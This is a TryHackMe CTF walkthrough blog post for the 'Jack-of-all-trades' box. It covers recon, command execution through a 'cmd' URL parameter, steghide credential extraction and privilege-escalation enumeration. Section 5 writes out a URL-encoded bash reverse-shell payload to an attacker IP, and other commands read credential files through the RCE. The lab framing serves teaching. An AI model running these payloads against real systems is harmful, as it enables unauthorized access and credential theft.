---
title: "Jack-of-all-trades — TryHackMe CTF Walkthrough"
date: 2025-11-06
author: shivam
categories: [ctf, tryhackme, writeup]
tags: [jack-of-all-trades, tryhackme, web, rce, priv-esc]
summary: "Step-by-step walkthrough for the Jack-of-all-trades TryHackMe box: recon, web discovery, RCE via unsafe cmd param, credential harvesting and privilege escalation."
image: 
  path: /assets/img/TryHackMe/jacktrades/jacktrades.jepg
  alt: "Jack-of-all-trades — site header screenshot"
---

> **Note:** All commands and screenshots shown are from my test lab. Do not run destructive actions against systems you do not own or have explicit permission to test.

## Table of contents

1. [Recon & port scan](#recon-and-port-scan)
2. [Web discovery & quick probing](#web-discovery-and-quick-probing)
3. [Remote command execution (RCE) via `cmd` parameter](#remote-command-execution-rce-via-cmd-parameter)
4. [Harvesting `jacks_password_list` and decoding](#harvesting-jacks_password_list-and-decoding)
5. [Initial access — get a shell as jack](#initial-access--get-a-shell-as-jack)
6. [Privilege escalation — finding root clues & flags](#privilege-escalation--finding-root-clues--flags)
7. [Root flag & cleanup](#root-flag--cleanup)
8. [References & notes](#references--notes)

---

## 1. Recon & port scan

Start with a quick nmap scan to see open services and versions.

```bash
# quick TCP scan with default scripts on common ports 22 and 80
nmap -sC -sV -p 22,80 <TARGET_IP>
```

Example output (screenshot):

![nmap results](/assets/img/TryHackMe/jacktrades/nmap_result.png)

Key findings from the scan:

* `80/tcp` — HTTP (Apache, site present)
* `22/tcp` — SSH (OpenSSH)
* HTTP title: *Jack-of-all-trades!* — hints at a web application to explore

Next step: open the web application in a browser.

---


## 2. Web discovery & quick probing

Browse to the target's web server (e.g. `http://<TARGET_IP>/`). Look at the page and try to find interesting endpoints:

* `/` main page (big welcome banner)
* common directories or files: `/assets/`, `/index.php`, etc.

Screenshots:

* Site header:
  ![site header](/assets/img/TryHackMe/jacktrades/site_header.png)

* Accessing a `cmd` parameter (we will discover this in the next section):
  ![site accessed with cmd param](/assets/img/TryHackMe/jacktrades/site_accesed.png)

**Tip:** When you see an input that looks like it runs a command (e.g. `index.php?cmd=...`), treat it cautiously — it may be vulnerable to command injection or RCE.

---


## 3. Remote command execution (RCE) via `cmd` parameter

We discovered a page that accepts a `cmd` query parameter and echoes output. Example: `http://<TARGET_IP>/index.php?cmd=ls%20-al%20/home`

When you can control a command directly in a URL, you may be able to run arbitrary commands as the web server user.

**Examples to probe:**

```text
# list root-level files or a directory:
http://<TARGET_IP>/index.php?cmd=ls%20-al%20/home

# view suspicious file jacks_password_list
http://<TARGET_IP>/index.php?cmd=cat%20/home/jacks_password_list
```

Screenshot showing the password list reflected raw (garbled / encoded-looking):

![password list](/assets/img/TryHackMe/jacktrades/passowrd_list.png)

The `jacks_password_list` appears to contain many lines of non-printable or symbolic characters — likely an encoded/encrypted blob or multiple password entries stored weirdly. We'll try to retrieve it fully and check different decoding techniques.

> **Important:** always URL-encode characters when crafting requests (space = `%20`, `|` = `%7C`, etc.). Many browsers will do this for you in the address bar, but when scripting use `curl` or `wget` with proper quoting.

---


## 4. Harvesting `jacks_password_list` and decoding

We retrieved the file contents via the `cmd` parameter. Save the output locally for offline analysis:

```bash
# save output using curl (example)
curl 'http://<TARGET_IP>/index.php?cmd=cat%20/home/jacks_password_list' -o jacks_password_list.txt
```

Open and attempt common decodings:

* Try `base64`, `rot13`, `rot47`, `hex`, `gzip`, `openssl enc -d`, etc.
* Check for repeated patterns, obvious headers/footers, or reversed text.
* If it looks like random bytes, treat it as either binary or an encrypted blob.

In this challenge the initial list looked like garbage, but later steps revealed we have other credentials and files on the site to extract (images, stego, etc.). Keep these possibilities in mind.

(Reference screenshot of raw contents in browser shown earlier.)

---



## 5. Initial access — get a shell as jack

While enumerating the web site we found an image header in `/assets/header.jpg`. This image contained hidden data extracted with `steghide`.

Steps performed:

1. Download `header.jpg`:

```bash
wget http://<TARGET_IP>/assets/header.jpg -O header.jpg
```

2. Use `steghide` to extract hidden data (some images have hidden credentials):

```bash
steghide extract -sf header.jpg
# if prompted for a passphrase, try empty or common ones used on the box
# extracted file: cms.creds (example)
```

Screenshot showing extraction & resulting credentials file:

![steg header extraction](/assets/img/TryHackMe/jacktrades/RCE.png)
(showing `cms.creds` extracted)

3. `cat cms.creds` produced:

```
Username: jackinthebox
Password: TplFxisHjY
```

(Example screenshot of creds extraction: ![creds extracted](/assets/img/TryHackMe/jacktrades/RCE.png) )

With these credentials we can attempt to log into the web CMS (or SSH if allowed).

4. If the web application provided a login page or admin panel, authenticate with the extracted credentials.

**Alternative initial shell via RCE:**

If the `cmd` parameter allows spawning interactive shells, you can pivot to a reverse shell:

```bash
# on your machine, start a listener
nc -lvnp 4444

# trigger a reverse shell from the webserver (URL-encoded)
http://<TARGET_IP>/index.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<YOUR_IP>%2F4444%200%3E%261%22
```

> The challenge used an extracted CMS credential to get further access (jack user). Use whichever route is most comfortable in the lab.

Once you have a shell (webshell or SSH), enumerate the system.

---



## 6. Privilege escalation — finding root clues & flags

After getting a shell as `jack` (or the web user), perform standard post-exploit enumeration:

* `id`, `whoami`
* `sudo -l` to see allowed commands
* search for SUID binaries, world-writable files, interesting cron jobs
* inspect home directories for credentials, notes, and clues

**Commands used:**

```bash
id
uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null   # find SUID binaries
ls -la /home/jack
strings /root/root.txt | less   # sometimes root file contains a hint
```

Screenshot example where `strings` showed a root note or to-do list:

![root strings](/assets/img/TryHackMe/jacktrades/root_flag.png)

From enumeration we found a `root` todo/note that contained the root password or a hint. In this specific box the route to root used:

* `strings` on a root file revealed an admin password or hint
* or `sudo -l` revealed a binary jack can run as root — use that to escalate

**If you find an SUID binary you cannot run directly**, inspect its behavior and see whether you can abuse environment variables, `LD_PRELOAD`, or pass it crafted arguments to execute a shell. Also check for scripts owned by root and writable by jack.

---


## 7. Root flag & cleanup

When you gained root (via `sudo` or another privilege escalation), get the root flag:

```bash
# as root
cat /root/root.txt
```

Example screenshot of the final root flag view:

![root flag](/assets/img/TryHackMe/jacktrades/root_flag.png)

**Cleanup:** After finishing your lab exercise:

* Remove any uploaded files or webshells from the target (if you control the lab VM).
* Close listeners and delete temporary files on your attacker machine.
* Do **not** leave credentials or backdoors on systems you don't own.

---



## 8. References & notes

* Tools used: `nmap`, browser, `curl`, `wget`, `steghide`, `strings`, `netcat`, shell
* Useful concepts: RCE via unsanitized command parameters, steganography (steg), credential harvesting, SUID/binary abuse
* Lab: TryHackMe — Jack-of-all-trades

---

